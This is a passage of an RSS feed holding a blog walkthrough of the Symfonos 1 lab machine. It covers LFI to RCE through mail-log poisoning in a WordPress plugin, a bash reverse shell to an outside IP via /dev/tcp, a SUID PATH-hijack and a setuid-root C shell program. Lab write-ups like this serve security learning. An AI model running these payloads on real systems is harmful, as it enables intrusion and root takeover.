+&lt;p>A typical method to escalate to RCE using LFI is poisoning log files but I wasn&amp;rsquo;t able to load any log
+file to use this method.
+With the presence of port 25 we can try sending an email and try accessing the email using LFI.&lt;/p>
+&lt;p>Sending email with payload:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos12.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>Visiting the mails for user helios in /var/mail/helios gives access to the poisoned file and we can run commands.&lt;/p>
+&lt;pre>&lt;code class="language-url" data-lang="url">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;amp;cmd=whoami
+&lt;/code>&lt;/pre>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos13.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>Now we can get a reverse shell using this payload:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">/bin/bash -c &lt;span style="color:#e6db74">&amp;#34;/bin/bash -i &amp;gt;%26 /dev/tcp/192.168.191.1/9000 0&amp;gt;%261 %26&amp;#34;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="privilege-escalation">Privilege Escalation&lt;/h1>
+&lt;p>Usual enumeration for privilege escalation involves looking for suid binaries by using find.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">find / -perm -4000 2&amp;gt;/dev/null
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The binary statuscheck isn&amp;rsquo;t among the linux default ones.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos14.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>After running it and then running strings against it, it calls the curl command when executed.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos15.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>Since it doesn&amp;rsquo;t use the absolute path we can abuse this by setting our own PATH and make it call our own custom
+curl command.&lt;/p>
+&lt;p>In my custom curl script I get a copy of bash and give it suid permissions:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos16.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;h3 id="rooted">Rooted&lt;/h3>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos17.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;h1 id="extras">Extras&lt;/h1>
+&lt;p>Better way to handle the sending email part using sendEmail:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sendEmail -t root@symfonos.localdomain -f test@sendEmailtest.com -s 192.168.191.128:25 -u &lt;span style="color:#e6db74">&amp;#34;Test Subject&amp;#34;&lt;/span> -m &lt;span style="color:#e6db74">&amp;#34;Test Message&amp;#34;&lt;/span> -o tls&lt;span style="color:#f92672">=&lt;/span>no
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Better suid exploit, compiling a c program that correctly sets the uid and gid as root.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span>&lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(){
+setgid(&lt;span style="color:#ae81ff">0&lt;/span>);
+setuid(&lt;span style="color:#ae81ff">0&lt;/span>);
+execl(&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>);
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Reason why sending mails addressed to other users drops all the mails to helios is because of aliases set in postfix: /etc/postfix/main.cf&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos18.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
+&lt;p>You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p>
+&lt;p>Twitter: &lt;a href="https://twitter.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
+&lt;/p>
+&lt;p>Github: &lt;a href="https://github.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
+&lt;/p></content></item></channel></rss>
